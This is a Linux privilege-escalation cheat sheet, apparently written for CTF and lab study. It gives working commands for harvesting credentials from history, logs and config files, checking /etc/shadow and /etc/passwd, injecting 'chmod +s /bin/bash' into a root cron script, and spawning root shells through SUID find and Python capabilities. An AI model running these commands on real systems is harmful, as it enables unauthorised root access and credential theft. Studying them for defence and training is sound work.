Linux Privilege Escalation — cheat sheet

A quick reference for Linux privilege escalation, focused on manual enumeration and the exploitation of common vectors found in CTFs and real environments.

// disclaimer
Content created strictly for educational purposes and the study of offensive security. Using these techniques against systems without prior authorization is illegal. Consolidated during hands-on workshops and labs as a quick reference guide.

1. System & environment enumeration

The first step is understanding where you are and what the current user has been doing.

System information

uname -a                # Kernel, architecture and OS version
cat /etc/os-release     # Distribution details

Command history

cat ~/.bash_history     # May contain typed passwords or sensitive paths

Internal services

Identify services listening only locally — they can be escalation vectors.

ss -tlnp                # Lists active ports and services

2. Searching for files and secrets

Use find and grep to locate config, backups or exposed credentials.

The find command

# Search by name, case-insensitive
find / -name "*flag*" -type f 2>/dev/null

# Search for sensitive extensions (.env, .conf, .bak)
find / -name "*.env" -o -name "*.conf" -o -name "*.bak" -type f 2>/dev/null

# Filter by a specific directory (e.g. /opt)
find /opt -name "config.txt" -type f

The grep command

# Search keywords recursively in the logs directory
grep -iEr "password|token|secret|cred" /var/log/ 2>/dev/null

# Analyze web access logs for specific patterns
grep -iE "robots|token|password|secret|cred" access.log

3. File permissions and credentials

Understanding Linux permissions (rwx) is key to spotting security flaws.

Critical files: check whether sensitive files have improper read/write permissions:

ls -la /etc/shadow      # If readable, you can try to crack the hashes
ls -la /etc/passwd      # If writable, you can create a root user

Lateral movement: passwords found in .env / .bak files are often reused by another user or root:

su <user>               # Try switching users with the passwords you found

4. Task scheduling (cron jobs)

Tasks that run automatically as root are critical vectors.

cat /etc/crontab

Attack vector: if a script run by cron is writable by your user, you can inject commands to get a root shell or change permissions.

Injection example: echo "chmod +s /bin/bash" >> /path/to/script.sh

5. SUID binaries (Set User ID)

Files with the SUID bit run with the owner's privileges (usually root).

# Find SUID binaries
find / -perm -u+s -type f 2>/dev/null

Exploitation via GTFOBins: when you find an unusual binary or a known utility (find, cp, vim), check GTFOBins.

# Example — if find has SUID
./find . -exec /bin/sh -p \; -quit

6. Linux capabilities

Capabilities split root's privileges into small pieces, letting binaries perform specific functions without being fully root.

# List file capabilities
getcap -r / 2>/dev/null

# Exploitation example (Python)
python3 -c "import os; os.setuid(0); os.execl('/bin/bash', '/bin/sh')"

7. Post-exploitation tips

# Upgrade the shell (TTY upgrade)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Check SUDO — what your user can run as sudo
sudo -l
